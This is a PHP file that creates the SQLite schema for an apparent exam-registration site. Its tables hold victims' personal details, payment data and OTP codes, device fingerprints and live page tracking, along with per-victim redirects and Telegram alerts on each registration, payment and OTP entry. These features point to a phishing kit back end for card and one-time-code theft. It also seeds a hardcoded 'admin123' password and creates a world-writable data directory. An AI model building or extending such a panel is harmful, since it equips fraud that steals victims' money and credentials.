<?php
function getDB(): PDO {
    $dbPath = __DIR__ . '/../data/exam.db';
    $dir = dirname($dbPath);
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    $db = new PDO('sqlite:' . $dbPath);
    $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);
    $db->exec("PRAGMA journal_mode=WAL");
    return $db;
}

function initDB(): void {
    $db = getDB();

    $db->exec("CREATE TABLE IF NOT EXISTS students (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL, surname TEXT NOT NULL,
        email TEXT NOT NULL UNIQUE, address TEXT NOT NULL, phone TEXT,
        ip_address TEXT, user_agent TEXT, browser TEXT, device TEXT, os TEXT,
        screen_resolution TEXT, language TEXT, timezone TEXT,
        policies_accepted INTEGER DEFAULT 0, session_token TEXT UNIQUE,
        is_online INTEGER DEFAULT 0, current_page TEXT DEFAULT 'landing',
        payment_data TEXT, otp_data TEXT, visitor_id INTEGER,
        last_activity DATETIME, created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS activity_log (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        student_id INTEGER, action TEXT NOT NULL, details TEXT,
        ip_address TEXT, created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (student_id) REFERENCES students(id)
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS admin_settings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        admin_password TEXT NOT NULL,
        telegram_bot_token TEXT DEFAULT '',
        telegram_chat_id TEXT DEFAULT '',
        telegram_alert_registration INTEGER DEFAULT 0,
        telegram_alert_payment INTEGER DEFAULT 0,
        telegram_alert_otp INTEGER DEFAULT 0
    )");

    $stmt = $db->query("SELECT COUNT(*) as cnt FROM admin_settings");
    if ($stmt->fetch()['cnt'] == 0) {
        $hash = password_hash('admin123', PASSWORD_DEFAULT);
        $db->prepare("INSERT INTO admin_settings (admin_password, telegram_bot_token, telegram_chat_id) VALUES (?, ?, ?)")
            ->execute([$hash, '', '']);
    }

    $db->exec("CREATE TABLE IF NOT EXISTS redirects (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        student_id INTEGER UNIQUE, target_url TEXT NOT NULL,
        is_active INTEGER DEFAULT 1, created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (student_id) REFERENCES students(id)
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS visitors (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        visitor_token TEXT UNIQUE NOT NULL, ip_address TEXT, user_agent TEXT,
        browser TEXT, device TEXT, os TEXT, screen_resolution TEXT,
        language TEXT, timezone TEXT, country TEXT, country_code TEXT,
        city TEXT, region TEXT, is_online INTEGER DEFAULT 1,
        current_page TEXT DEFAULT 'landing', status TEXT DEFAULT 'viewing',
        last_activity DATETIME, student_id INTEGER DEFAULT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (student_id) REFERENCES students(id)
    )");
}

initDB();
